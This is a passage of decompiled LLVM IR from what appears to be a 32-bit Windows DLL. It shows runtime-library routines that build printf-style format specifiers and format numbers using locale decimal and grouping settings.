  %195 = ptrtoint i32* %stack_var_-96 to i32, !insn.addr !2712
  store i32 %195, i32* %.pre-phi18.reload, align 4, !insn.addr !2712
  store i32 %arg1, i32* %.pre-phi20.reload, align 4, !insn.addr !2713
  %196 = call i32 @function_10005510(i32 %189, i32 %192, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2714
  store i32 %edi.1.reload, i32* %.pre-phi23.reload, align 4, !insn.addr !2697
  store i32 %arg6, i32* %.pre-phi27.reload, align 4, !insn.addr !2698
  %197 = inttoptr i32 %196 to i32*, !insn.addr !2715
  %198 = load i32, i32* %197, align 4, !insn.addr !2715
  %199 = add i32 %196, 4, !insn.addr !2716
  %200 = inttoptr i32 %199 to i32*, !insn.addr !2716
  %201 = load i32, i32* %200, align 4, !insn.addr !2716
  store i32 %201, i32* %.pre-phi31.reload, align 4, !insn.addr !2699
  store i32 %198, i32* %.pre-phi35.reload, align 4, !insn.addr !2700
  %202 = add i32 %arg5, 32, !insn.addr !2717
  %203 = inttoptr i32 %202 to i32*, !insn.addr !2717
  store i32 0, i32* %203, align 4, !insn.addr !2717
  store i32 0, i32* %103, align 4, !insn.addr !2718
  store i32 %arg2, i32* %.pre-phi39.reload, align 4, !insn.addr !2701
  store i32 %arg1, i32* %.pre-phi43.reload, align 4, !insn.addr !2702
  %204 = call i32 @function_100054a0(i32 %198, i32 %201, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2719
  br i1 %65, label %dec_label_pc_100058d9, label %dec_label_pc_10005897, !insn.addr !2720

dec_label_pc_10005897:                            ; preds = %dec_label_pc_10005830
  %205 = load i8, i8* %stack_var_-68, align 1, !insn.addr !2721
  %206 = sext i8 %205 to i32, !insn.addr !2721
  %207 = add i32 %0, 1, !insn.addr !2722
  %208 = icmp ult i32 %207, 4096, !insn.addr !2723
  store i32 %206, i32* %ecx.0.reg2mem, !insn.addr !2724
  br i1 %208, label %dec_label_pc_100058d0, label %dec_label_pc_100058a2, !insn.addr !2724

dec_label_pc_100058a2:                            ; preds = %dec_label_pc_10005897
  %209 = and i32 %206, 31
  %210 = icmp eq i32 %209, 0, !insn.addr !2725
  br i1 %210, label %dec_label_pc_100058ac, label %dec_label_pc_100058a7, !insn.addr !2726

dec_label_pc_100058a7:                            ; preds = %dec_label_pc_100058a2
  %211 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2727
  br label %dec_label_pc_100058ac, !insn.addr !2727

dec_label_pc_100058ac:                            ; preds = %dec_label_pc_100058a7, %dec_label_pc_100058a2
  %212 = add nsw i32 %206, -4, !insn.addr !2728
  %213 = inttoptr i32 %212 to i32*, !insn.addr !2728
  %214 = load i32, i32* %213, align 4, !insn.addr !2728
  %215 = icmp ult i32 %214, %206, !insn.addr !2729
  store i32 %214, i32* %eax.2.reg2mem, !insn.addr !2730
  br i1 %215, label %dec_label_pc_100058b8, label %dec_label_pc_100058b3, !insn.addr !2730

dec_label_pc_100058b3:                            ; preds = %dec_label_pc_100058ac
  %216 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2731
  store i32 %216, i32* %eax.2.reg2mem, !insn.addr !2731
  br label %dec_label_pc_100058b8, !insn.addr !2731

dec_label_pc_100058b8:                            ; preds = %dec_label_pc_100058b3, %dec_label_pc_100058ac
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %217 = sub i32 %206, %eax.2.reload, !insn.addr !2732
  %218 = icmp ult i32 %217, 4, !insn.addr !2733
  %219 = icmp eq i1 %218, false, !insn.addr !2734
  store i32 %eax.2.reload, i32* %eax.3.reg2mem, !insn.addr !2734
  br i1 %219, label %dec_label_pc_100058c4, label %dec_label_pc_100058bf, !insn.addr !2734

dec_label_pc_100058bf:                            ; preds = %dec_label_pc_100058b8
  %220 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2735
  store i32 %220, i32* %eax.3.reg2mem, !insn.addr !2735
  br label %dec_label_pc_100058c4, !insn.addr !2735

dec_label_pc_100058c4:                            ; preds = %dec_label_pc_100058bf, %dec_label_pc_100058b8
  %eax.3.reload = load i32, i32* %eax.3.reg2mem
  %221 = icmp ult i32 %217, 36
  store i32 %eax.3.reload, i32* %ecx.0.reg2mem, !insn.addr !2736
  br i1 %221, label %dec_label_pc_100058d0, label %dec_label_pc_100058c9, !insn.addr !2736

dec_label_pc_100058c9:                            ; preds = %dec_label_pc_100058c4
  %222 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !2737
  store i32 %222, i32* %ecx.0.reg2mem, !insn.addr !2737
  br label %dec_label_pc_100058d0, !insn.addr !2737

dec_label_pc_100058d0:                            ; preds = %dec_label_pc_100058c4, %dec_label_pc_100058c9, %dec_label_pc_10005897
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  store i32 %ecx.0.reload, i32* %.pre-phi10.reload, align 4, !insn.addr !2738
  call void @_free(i32* nonnull @1), !insn.addr !2739
  br label %dec_label_pc_100058d9, !insn.addr !2740

dec_label_pc_100058d9:                            ; preds = %dec_label_pc_100058d0, %dec_label_pc_10005830
  store i8 0, i8* %stack_var_-68, align 1, !insn.addr !2741
  %223 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2742
  call void @__writefsdword(i32 0, i32 %223), !insn.addr !2743
  %224 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2744
  ret i32 %224, !insn.addr !2745
}

define i32 @function_10005960(i32 %arg1, i32* %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_10005960:
  %eax.2.reg2mem = alloca i32, !insn.addr !2746
  %eax.1.reg2mem = alloca i32, !insn.addr !2746
  %eax.0.reg2mem = alloca i32, !insn.addr !2746
  %0 = ptrtoint i8* %arg3 to i32
  %1 = inttoptr i32 %arg1 to i8*, !insn.addr !2747
  store i8 37, i8* %1, align 1, !insn.addr !2747
  %2 = add i32 %arg1, 1, !insn.addr !2748
  %3 = and i32 %0, 32
  %4 = icmp eq i32 %3, 0, !insn.addr !2749
  store i32 %2, i32* %eax.0.reg2mem, !insn.addr !2750
  br i1 %4, label %dec_label_pc_1000597a, label %dec_label_pc_10005976, !insn.addr !2750

dec_label_pc_10005976:                            ; preds = %dec_label_pc_10005960
  %5 = inttoptr i32 %2 to i8*, !insn.addr !2751
  store i8 43, i8* %5, align 1, !insn.addr !2751
  %6 = add i32 %arg1, 2, !insn.addr !2752
  store i32 %6, i32* %eax.0.reg2mem, !insn.addr !2752
  br label %dec_label_pc_1000597a, !insn.addr !2752

dec_label_pc_1000597a:                            ; preds = %dec_label_pc_10005976, %dec_label_pc_10005960
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %7 = and i32 %0, 8
  %8 = icmp eq i32 %7, 0, !insn.addr !2753
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2754
  br i1 %8, label %dec_label_pc_10005983, label %dec_label_pc_1000597f, !insn.addr !2754

dec_label_pc_1000597f:                            ; preds = %dec_label_pc_1000597a
  %9 = inttoptr i32 %eax.0.reload to i8*, !insn.addr !2755
  store i8 35, i8* %9, align 1, !insn.addr !2755
  %10 = add i32 %eax.0.reload, 1, !insn.addr !2756
  store i32 %10, i32* %eax.1.reg2mem, !insn.addr !2756
  br label %dec_label_pc_10005983, !insn.addr !2756

dec_label_pc_10005983:                            ; preds = %dec_label_pc_1000597f, %dec_label_pc_1000597a
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %11 = bitcast i32* %arg2 to i8*, !insn.addr !2757
  %12 = load i8, i8* %11, align 1, !insn.addr !2757
  %13 = icmp eq i8 %12, 76, !insn.addr !2758
  br i1 %13, label %dec_label_pc_10005991, label %dec_label_pc_1000598d, !insn.addr !2759

dec_label_pc_1000598d:                            ; preds = %dec_label_pc_10005983
  %14 = inttoptr i32 %eax.1.reload to i8*, !insn.addr !2760
  store i8 %12, i8* %14, align 1, !insn.addr !2760
  store i32 %eax.1.reload, i32* %eax.2.reg2mem, !insn.addr !2761
  br label %dec_label_pc_1000599c, !insn.addr !2761

dec_label_pc_10005991:                            ; preds = %dec_label_pc_10005983
  %15 = inttoptr i32 %eax.1.reload to i16*, !insn.addr !2762
  store i16 13897, i16* %15, align 2, !insn.addr !2762
  %16 = add i32 %eax.1.reload, 2, !insn.addr !2763
  %17 = inttoptr i32 %16 to i8*, !insn.addr !2764
  store i8 52, i8* %17, align 1, !insn.addr !2764
  store i32 %16, i32* %eax.2.reg2mem, !insn.addr !2764
  br label %dec_label_pc_1000599c, !insn.addr !2764

dec_label_pc_1000599c:                            ; preds = %dec_label_pc_10005991, %dec_label_pc_1000598d
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %18 = and i32 %0, 3584, !insn.addr !2765
  %19 = icmp eq i32 %18, 1024, !insn.addr !2766
  %20 = icmp eq i1 %19, false, !insn.addr !2767
  br i1 %20, label %dec_label_pc_100059bb, label %dec_label_pc_100059ac, !insn.addr !2767

dec_label_pc_100059ac:                            ; preds = %dec_label_pc_1000599c
  %21 = add i32 %eax.2.reload, 1, !insn.addr !2768
  %22 = inttoptr i32 %21 to i8*, !insn.addr !2768
  store i8 111, i8* %22, align 1, !insn.addr !2768
  %23 = add i32 %eax.2.reload, 2, !insn.addr !2769
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2769
  store i8 0, i8* %24, align 1, !insn.addr !2769
  ret i32 %arg1, !insn.addr !2770

dec_label_pc_100059bb:                            ; preds = %dec_label_pc_1000599c
  %25 = icmp eq i32 %18, 2048, !insn.addr !2771
  br i1 %25, label %dec_label_pc_100059d3, label %dec_label_pc_100059c3, !insn.addr !2772

dec_label_pc_100059c3:                            ; preds = %dec_label_pc_100059bb
  %26 = ptrtoint i32* %arg2 to i32
  %27 = add i32 %26, 1, !insn.addr !2773
  %28 = inttoptr i32 %27 to i8*, !insn.addr !2773
  %29 = load i8, i8* %28, align 1, !insn.addr !2773
  %30 = add i32 %eax.2.reload, 1, !insn.addr !2774
  %31 = inttoptr i32 %30 to i8*, !insn.addr !2774
  store i8 %29, i8* %31, align 1, !insn.addr !2774
  %32 = add i32 %eax.2.reload, 2, !insn.addr !2775
  %33 = inttoptr i32 %32 to i8*, !insn.addr !2775
  store i8 0, i8* %33, align 1, !insn.addr !2775
  ret i32 %arg1, !insn.addr !2776

dec_label_pc_100059d3:                            ; preds = %dec_label_pc_100059bb
  %.tr = trunc i32 %0 to i8
  %34 = mul i8 %.tr, 8
  %35 = and i8 %34, 32
  %36 = xor i8 %35, 120, !insn.addr !2777
  %37 = add i32 %eax.2.reload, 1, !insn.addr !2777
  %38 = inttoptr i32 %37 to i8*, !insn.addr !2777
  store i8 %36, i8* %38, align 1, !insn.addr !2777
  %39 = add i32 %eax.2.reload, 2, !insn.addr !2778
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2778
  store i8 0, i8* %40, align 1, !insn.addr !2778
  ret i32 %arg1, !insn.addr !2779
}

define i32 @function_100059f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_100059f0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !2780
  %eax.4.reg2mem = alloca i32, !insn.addr !2780
  %eax.3.reg2mem = alloca i32, !insn.addr !2780
  %esi.1.reg2mem = alloca i32, !insn.addr !2780
  %eax.2.reg2mem = alloca i32, !insn.addr !2780
  %.pre-phi11.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi13.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi15.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi17.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi19.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi21.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi24.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi28.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi32.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi36.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi40.reg2mem = alloca i32*, !insn.addr !2780
  %.pre-phi44.reg2mem = alloca i32*, !insn.addr !2780
  %storemerge.reg2mem = alloca i32, !insn.addr !2780
  %esp.3.reg2mem = alloca i32, !insn.addr !2780
  %edi.0.reg2mem = alloca i32, !insn.addr !2780
  %esi.0.reg2mem = alloca i32, !insn.addr !2780
  %esp.2.reg2mem = alloca i32, !insn.addr !2780
  %.reg2mem51 = alloca i8, !insn.addr !2780
  %.reg2mem = alloca i32, !insn.addr !2780
  %esp.1.reg2mem = alloca i32, !insn.addr !2780
  %esp.0.reg2mem = alloca i32, !insn.addr !2780
  %ebx.0.reg2mem = alloca i32, !insn.addr !2780
  %edx.0.reg2mem = alloca i32, !insn.addr !2780
  %storemerge6.reg2mem = alloca i32, !insn.addr !2780
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-44 = alloca i8, align 1
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-76 = alloca i16, align 2
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-128 = alloca i8*, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2781
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !2782
  %3 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2783
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2784
  %4 = icmp eq i32 %arg8, 0, !insn.addr !2785
  br i1 %4, label %dec_label_pc_10005a48, label %dec_label_pc_10005a37, !insn.addr !2786

dec_label_pc_10005a37:                            ; preds = %dec_label_pc_100059f0
  %5 = inttoptr i32 %arg7 to i8*, !insn.addr !2787
  %6 = load i8, i8* %5, align 1, !insn.addr !2787
  %7 = icmp ne i8 %6, 43, !insn.addr !2788
  %8 = icmp eq i8 %6, 45, !insn.addr !2789
  %9 = icmp eq i1 %8, false, !insn.addr !2790
  %or.cond = icmp eq i1 %7, %9
  store i32 1, i32* %storemerge6.reg2mem, !insn.addr !2791
  br i1 %or.cond, label %dec_label_pc_10005a48, label %dec_label_pc_10005a4a, !insn.addr !2791

dec_label_pc_10005a48:                            ; preds = %dec_label_pc_10005a37, %dec_label_pc_100059f0
  store i32 0, i32* %storemerge6.reg2mem, !insn.addr !2792
  br label %dec_label_pc_10005a4a, !insn.addr !2792

dec_label_pc_10005a4a:                            ; preds = %dec_label_pc_10005a37, %dec_label_pc_10005a48
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %10 = add i32 %arg5, 20, !insn.addr !2793
  %11 = inttoptr i32 %10 to i32*, !insn.addr !2793
  %12 = load i32, i32* %11, align 4, !insn.addr !2793
  %13 = and i32 %12, 12288, !insn.addr !2794
  %14 = icmp eq i32 %13, 12288, !insn.addr !2795
  store i32 ptrtoint ([3 x i8]* @global_var_100393a0 to i32), i32* %edx.0.reg2mem, !insn.addr !2796
  store i32 %storemerge6.reload, i32* %ebx.0.reg2mem, !insn.addr !2796
  br i1 %14, label %dec_label_pc_10005a60, label %dec_label_pc_10005a82, !insn.addr !2796

dec_label_pc_10005a60:                            ; preds = %dec_label_pc_10005a4a
  %15 = or i32 %storemerge6.reload, 2, !insn.addr !2797
  %16 = icmp ugt i32 %15, %arg8
  store i32 ptrtoint ([3 x i8]* @global_var_100393a4 to i32), i32* %edx.0.reg2mem, !insn.addr !2798
  store i32 %storemerge6.reload, i32* %ebx.0.reg2mem, !insn.addr !2798
  br i1 %16, label %dec_label_pc_10005a82, label %dec_label_pc_10005a6c, !insn.addr !2798

dec_label_pc_10005a6c:                            ; preds = %dec_label_pc_10005a60
  %17 = add i32 %storemerge6.reload, %arg7
  %18 = inttoptr i32 %17 to i8*, !insn.addr !2799
  %19 = load i8, i8* %18, align 1, !insn.addr !2799
  %20 = icmp eq i8 %19, 48, !insn.addr !2799
  %21 = icmp eq i1 %20, false, !insn.addr !2800
  store i32 ptrtoint ([3 x i8]* @global_var_100393a4 to i32), i32* %edx.0.reg2mem, !insn.addr !2800
  store i32 %storemerge6.reload, i32* %ebx.0.reg2mem, !insn.addr !2800
  br i1 %21, label %dec_label_pc_10005a82, label %dec_label_pc_10005a72, !insn.addr !2800

dec_label_pc_10005a72:                            ; preds = %dec_label_pc_10005a6c
  %22 = add i32 %17, 1, !insn.addr !2801
  %23 = inttoptr i32 %22 to i8*, !insn.addr !2801
  %24 = load i8, i8* %23, align 1, !insn.addr !2801
  %25 = icmp ne i8 %24, 120, !insn.addr !2802
  %26 = icmp eq i8 %24, 88, !insn.addr !2803
  %27 = icmp eq i1 %26, false, !insn.addr !2804
  %or.cond9 = icmp eq i1 %25, %27
  %spec.select10 = select i1 %or.cond9, i32 %storemerge6.reload, i32 %15
  store i32 ptrtoint ([3 x i8]* @global_var_100393a4 to i32), i32* %edx.0.reg2mem
  store i32 %spec.select10, i32* %ebx.0.reg2mem
  br label %dec_label_pc_10005a82

dec_label_pc_10005a82:                            ; preds = %dec_label_pc_10005a72, %dec_label_pc_10005a4a, %dec_label_pc_10005a60, %dec_label_pc_10005a6c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %28 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !2805
  store i8* %28, i8** %stack_var_-128, align 4, !insn.addr !2805
  store i32 %arg7, i32* %stack_var_-132, align 4, !insn.addr !2806
  %29 = inttoptr i32 %arg7 to i8*, !insn.addr !2807
  %30 = call i32 @_strcspn(i8* %29, i8* %28), !insn.addr !2807
  store i16 46, i16* %stack_var_-76, align 2, !insn.addr !2808
  %31 = call %lconv* @_localeconv(), !insn.addr !2809
  %32 = bitcast %lconv* %31 to i32*, !insn.addr !2810
  %33 = load i32, i32* %32, align 4, !insn.addr !2810
  %34 = inttoptr i32 %33 to i8*, !insn.addr !2811
  %35 = load i8, i8* %34, align 1, !insn.addr !2811
  %36 = sext i8 %35 to i16, !insn.addr !2812
  store i16 %36, i16* %stack_var_-76, align 2, !insn.addr !2812
  %37 = bitcast i16* %stack_var_-76 to i8*
  %38 = call i32 @_strcspn(i8* %29, i8* nonnull %37), !insn.addr !2813
  %39 = bitcast i32* %stack_var_-88 to i8*
  store i8* %39, i8** %stack_var_-128, align 4, !insn.addr !2814
  %40 = ptrtoint i32* %stack_var_-88 to i32, !insn.addr !2815
  store i32 %40, i32* %stack_var_-132, align 4, !insn.addr !2815
  %41 = ptrtoint i8** %stack_var_-128 to i32, !insn.addr !2816
  %42 = icmp eq i32 %1, 0, !insn.addr !2817
  store i32 %41, i32* %esp.0.reg2mem, !insn.addr !2818
  br i1 %42, label %dec_label_pc_10005aed, label %dec_label_pc_10005adc, !insn.addr !2818

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_10005a82
  %43 = inttoptr i32 %1 to i32*, !insn.addr !2819
  %44 = load i32, i32* %43, align 4, !insn.addr !2819
  %45 = icmp eq i32 %44, 0, !insn.addr !2820
  store i32 %41, i32* %esp.0.reg2mem, !insn.addr !2821
  br i1 %45, label %dec_label_pc_10005aed, label %dec_label_pc_10005ae7, !insn.addr !2821

dec_label_pc_10005ae7:                            ; preds = %dec_label_pc_10005adc
  store i32 1, i32* %stack_var_-132, align 4, !insn.addr !2822
  %46 = ptrtoint i32* %stack_var_-132 to i32, !insn.addr !2822
  store i32 %46, i32* %esp.0.reg2mem, !insn.addr !2823
  br label %dec_label_pc_10005aed, !insn.addr !2823

dec_label_pc_10005aed:                            ; preds = %dec_label_pc_10005ae7, %dec_label_pc_10005adc, %dec_label_pc_10005a82
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %47 = add i32 %esp.0.reload, -4, !insn.addr !2824
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2824
  store i32 0, i32* %48, align 4, !insn.addr !2824
  %49 = add i32 %esp.0.reload, -8, !insn.addr !2825
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2825
  store i32 %arg8, i32* %50, align 4, !insn.addr !2825
  store i8 0, i8* %stack_var_-44, align 1, !insn.addr !2826
  %51 = ptrtoint i8* %stack_var_-44 to i32, !insn.addr !2827
  %52 = add i32 %esp.0.reload, -12, !insn.addr !2828
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2828
  store i32 %51, i32* %53, align 4, !insn.addr !2828
  %54 = add i32 %arg8, %arg7, !insn.addr !2829
  %55 = add i32 %esp.0.reload, -16, !insn.addr !2830
  %56 = inttoptr i32 %55 to i32*, !insn.addr !2830
  store i32 %54, i32* %56, align 4, !insn.addr !2830
  %57 = add i32 %esp.0.reload, -20, !insn.addr !2831
  %58 = inttoptr i32 %57 to i32*, !insn.addr !2831
  store i32 %arg7, i32* %58, align 4, !insn.addr !2831
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2832
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2832
  store i32 %40, i32* %60, align 4, !insn.addr !2832
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2833
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2833
  store i32 %40, i32* %62, align 4, !insn.addr !2833
  %63 = load i32, i32* %stack_var_-132, align 4, !insn.addr !2834
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2834
  %65 = load i8*, i8** %stack_var_-128, align 4, !insn.addr !2834
  %66 = bitcast i8* %65 to i32*
  %67 = call i32 @function_10006dc0(i32* %64, i32* %66), !insn.addr !2834
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !2835
  br i1 %42, label %dec_label_pc_10005b74, label %dec_label_pc_10005b63, !insn.addr !2835

dec_label_pc_10005b63:                            ; preds = %dec_label_pc_10005aed
  %68 = inttoptr i32 %1 to i32*, !insn.addr !2836
  %69 = load i32, i32* %68, align 4, !insn.addr !2836
  %70 = icmp eq i32 %69, 0, !insn.addr !2837
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !2838
  br i1 %70, label %dec_label_pc_10005b74, label %dec_label_pc_10005b6e, !insn.addr !2838

dec_label_pc_10005b6e:                            ; preds = %dec_label_pc_10005b63
  store i32 1, i32* %62, align 4, !insn.addr !2839
  store i32 %61, i32* %esp.1.reg2mem, !insn.addr !2840
  br label %dec_label_pc_10005b74, !insn.addr !2840

dec_label_pc_10005b74:                            ; preds = %dec_label_pc_10005b6e, %dec_label_pc_10005b63, %dec_label_pc_10005aed
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %71 = add i32 %esp.1.reload, -4, !insn.addr !2841
  %72 = inttoptr i32 %71 to i32*, !insn.addr !2841
  %73 = ptrtoint i8* %stack_var_-68 to i32, !insn.addr !2841
  store i32 %73, i32* %72, align 4, !insn.addr !2841
  %74 = call i32 @function_10006360(i32 %67), !insn.addr !2842
  %75 = inttoptr i32 %67 to i32*, !insn.addr !2843
  %76 = load i32, i32* %75, align 4, !insn.addr !2843
  %77 = add i32 %76, 16, !insn.addr !2844
  %78 = inttoptr i32 %77 to i32*, !insn.addr !2844
  %79 = load i32, i32* %78, align 4, !insn.addr !2844
  %80 = icmp eq i32 %38, %arg8, !insn.addr !2845
  store i32 %30, i32* %.reg2mem, !insn.addr !2846
  br i1 %80, label %87, label %dec_label_pc_10005bb6, !insn.addr !2846

dec_label_pc_10005bb6:                            ; preds = %dec_label_pc_10005b74
  %81 = add i32 %76, 12, !insn.addr !2847
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2847
  %83 = load i32, i32* %82, align 4, !insn.addr !2847
  %84 = trunc i32 %83 to i8, !insn.addr !2848
  %85 = add i32 %38, %51, !insn.addr !2848
  %86 = inttoptr i32 %85 to i8*, !insn.addr !2848
  store i8 %84, i8* %86, align 1, !insn.addr !2848
  store i32 %38, i32* %.reg2mem
  br label %87

; <label>:87:                                     ; preds = %dec_label_pc_10005b74, %dec_label_pc_10005bb6
  %sext = mul i32 %79, 16777216
  %88 = sdiv i32 %sext, 16777216, !insn.addr !2849
  %.reload = load i32, i32* %.reg2mem
  %89 = icmp ult i32 %0, 16, !insn.addr !2850
  %90 = icmp eq i1 %89, false, !insn.addr !2851
  %91 = load i8, i8* %stack_var_-68, align 1, !insn.addr !2851
  %92 = sext i8 %91 to i32, !insn.addr !2851
  %93 = select i1 %90, i32 %92, i32 %73, !insn.addr !2851
  %94 = inttoptr i32 %93 to i8*, !insn.addr !2852
  %95 = load i8, i8* %94, align 1, !insn.addr !2852
  %96 = icmp eq i8 %95, 127, !insn.addr !2852
  store i8 %95, i8* %.reg2mem51, !insn.addr !2853
  store i32 %71, i32* %esp.2.reg2mem, !insn.addr !2853
  store i32 %93, i32* %esi.0.reg2mem, !insn.addr !2853
  store i32 %.reload, i32* %edi.0.reg2mem, !insn.addr !2853
  store i32 %71, i32* %esp.3.reg2mem, !insn.addr !2853
  br i1 %96, label %dec_label_pc_10005c02, label %dec_label_pc_10005bd0, !insn.addr !2853

dec_label_pc_10005bd0:                            ; preds = %87, %dec_label_pc_10005be1
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %.reload52 = load i8, i8* %.reg2mem51, !insn.addr !2854
  %97 = icmp slt i8 %.reload52, 1
  store i32 %esp.2.reload, i32* %esp.3.reg2mem, !insn.addr !2855
  br i1 %97, label %dec_label_pc_10005c02, label %dec_label_pc_10005bd6, !insn.addr !2855

dec_label_pc_10005bd6:                            ; preds = %dec_label_pc_10005bd0
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %98 = sext i8 %.reload52 to i32, !insn.addr !2856
  %99 = sub i32 %edi.0.reload, %ebx.0.reload, !insn.addr !2857
  %100 = icmp ugt i32 %99, %98, !insn.addr !2858
  %101 = icmp eq i1 %100, false, !insn.addr !2859
  store i32 %esp.2.reload, i32* %esp.3.reg2mem, !insn.addr !2859
  br i1 %101, label %dec_label_pc_10005c02, label %dec_label_pc_10005be1, !insn.addr !2859

dec_label_pc_10005be1:                            ; preds = %dec_label_pc_10005bd6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %102 = add i32 %esp.2.reload, -4, !insn.addr !2860
  %103 = inttoptr i32 %102 to i32*, !insn.addr !2860
  store i32 %88, i32* %103, align 4, !insn.addr !2860
  %104 = sub i32 %edi.0.reload, %98, !insn.addr !2861
  %105 = add i32 %esp.2.reload, -8, !insn.addr !2862
  %106 = inttoptr i32 %105 to i32*, !insn.addr !2862
  store i32 1, i32* %106, align 4, !insn.addr !2862
  %107 = add i32 %esp.2.reload, -12, !insn.addr !2863
  %108 = inttoptr i32 %107 to i32*, !insn.addr !2863
  store i32 %104, i32* %108, align 4, !insn.addr !2863
  %109 = add i32 %esi.0.reload, 1, !insn.addr !2864
  %110 = inttoptr i32 %109 to i8*, !insn.addr !2864
  %111 = load i8, i8* %110, align 1, !insn.addr !2864
  %112 = icmp sgt i8 %111, 0
  %113 = zext i1 %112 to i32, !insn.addr !2865
  %114 = add i32 %esi.0.reload, %113, !insn.addr !2866
  %115 = inttoptr i32 %114 to i8*, !insn.addr !2867
  %116 = load i8, i8* %115, align 1, !insn.addr !2867
  %117 = icmp eq i8 %116, 127, !insn.addr !2867
  %118 = icmp eq i1 %117, false, !insn.addr !2868
  store i8 %116, i8* %.reg2mem51, !insn.addr !2868
  store i32 %107, i32* %esp.2.reg2mem, !insn.addr !2868
  store i32 %114, i32* %esi.0.reg2mem, !insn.addr !2868
  store i32 %104, i32* %edi.0.reg2mem, !insn.addr !2868
  store i32 %107, i32* %esp.3.reg2mem, !insn.addr !2868
  br i1 %118, label %dec_label_pc_10005bd0, label %dec_label_pc_10005c02, !insn.addr !2868

dec_label_pc_10005c02:                            ; preds = %dec_label_pc_10005be1, %dec_label_pc_10005bd6, %dec_label_pc_10005bd0, %87
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %119 = add i32 %arg5, 36, !insn.addr !2869
  %120 = inttoptr i32 %119 to i32*, !insn.addr !2869
  %121 = load i32, i32* %120, align 4, !insn.addr !2869
  %122 = icmp slt i32 %121, 0, !insn.addr !2869
  store i32 0, i32* %storemerge.reg2mem, !insn.addr !2870
  br i1 %122, label %dec_label_pc_10005c26, label %dec_label_pc_10005c11, !insn.addr !2870

dec_label_pc_10005c11:                            ; preds = %dec_label_pc_10005c02
  %.pre45 = add i32 %arg5, 32
  %.pre47 = inttoptr i32 %.pre45 to i32*
  %.pre49 = load i32, i32* %.pre47, align 4
  %123 = or i32 %121, %.pre49
  %124 = icmp eq i32 %123, 0
  %spec.select = select i1 %124, i32 0, i32 %.pre49
  store i32 %spec.select, i32* %storemerge.reg2mem
  br label %dec_label_pc_10005c26

dec_label_pc_10005c26:                            ; preds = %dec_label_pc_10005c11, %dec_label_pc_10005c02
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %125 = load i32, i32* %11, align 4, !insn.addr !2871
  %126 = and i32 %125, 448, !insn.addr !2872
  switch i32 %126, label %dec_label_pc_10005c3e [
    i32 64, label %dec_label_pc_10005cce
    i32 256, label %dec_label_pc_10005c86
  ]

dec_label_pc_10005c3e:                            ; preds = %dec_label_pc_10005c26
  %127 = add i32 %esp.3.reload, -4
  %128 = inttoptr i32 %127 to i32*
  store i32 %storemerge.reload, i32* %128, align 4, !insn.addr !2873
  %129 = add i32 %esp.3.reload, -8
  %130 = inttoptr i32 %129 to i32*
  store i32 %arg6, i32* %130, align 4, !insn.addr !2874
  %131 = add i32 %esp.3.reload, -12
  %132 = inttoptr i32 %131 to i32*
